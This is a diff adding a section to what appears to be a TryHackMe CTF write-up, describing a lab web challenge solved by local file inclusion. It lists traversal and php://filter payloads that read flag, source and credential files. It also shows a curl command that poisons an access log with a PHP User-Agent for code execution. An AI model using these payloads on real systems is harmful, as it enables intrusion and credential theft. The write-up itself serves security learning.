@@ -130,13 +130,55 @@ Answer:
 
 ## Day 6: Patch Management Is Hard
 
+after access to the webpage, it redirect to a link
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/098804ac-55d9-4464-9bf2-df9f3ca19d5f)
 
+use LFI vulnerabler to get flag `?err=../../../etc/flag`
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/edf4839e-347d-4133-b850-f2480ffbf5c4)
 
+use PHP filter technique to bypass LFI `?err=php://filter/convert.base64-encode/resource=index.php`
 
+then decode base64, we get the source code
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4a61545f-2d6d-46fe-a674-04e070b9bf14)
 
+we know that program include a credential from file, got it and decode
+
+```
+?err=php://filter/convert.base64-encode/resource=./includes/creds.php
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6016dd96-fd32-4690-943b-32966ed661cb)
+
+login to mcskidy acc, i see a manage panel
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5911c5bf-1b1d-4992-a694-4073e40631f7)
+
+check the recovery password
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cb71b1c7-2c38-48ff-b882-65f3859ddbfe)
+
+check the log access
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/685a1dfd-19ec-40d4-91d9-22704fe1b4c3)
+
+we were able to include the User-Agent value we wanted
+
+```
+curl -A "<?php phpinfo();?>" http://10.10.115.155/login.php
+```
+
+and using LFI to see the result at `?err=./includes/logs/app_access.log`
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/21673a50-9c2b-48df-a39c-bd050ca0878a)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e393fff9-ec89-476b-9c63-c552cfec2d08)
+
+## Day 7: Migration Without Security
 
 
 
